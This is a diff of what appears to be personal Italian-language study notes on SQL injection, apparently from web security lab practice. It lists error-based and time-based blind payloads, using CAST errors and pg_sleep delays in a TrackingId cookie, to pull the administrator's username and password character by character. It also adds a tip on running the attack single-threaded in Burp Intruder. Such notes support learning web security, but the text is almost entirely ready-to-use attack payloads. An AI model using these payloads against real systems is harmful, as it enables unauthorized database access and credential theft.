@@ -125,6 +125,8 @@ TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--   -> rimo
 TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 
 
+QUANDO VIENE FATTO QUESTO TIPO DI ATTACCO DA INTRUDER È IMPORTANTISSIMO METTERE RESOURCE POOL SU 1 PER USARE SOLO 1 THREAD E SEGUIRE TUTTE LE RICHIESTE UNA DOPO L'ALTRA PER CONTROLLARE I TIMERS
+
 TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--   -> find user chiamato administrator nella tabella users tramite time delay
 TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--       -> trovare lunghezza password tramite time delay
 TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--        -> per recuperare caratteri passowrd tramite time delay
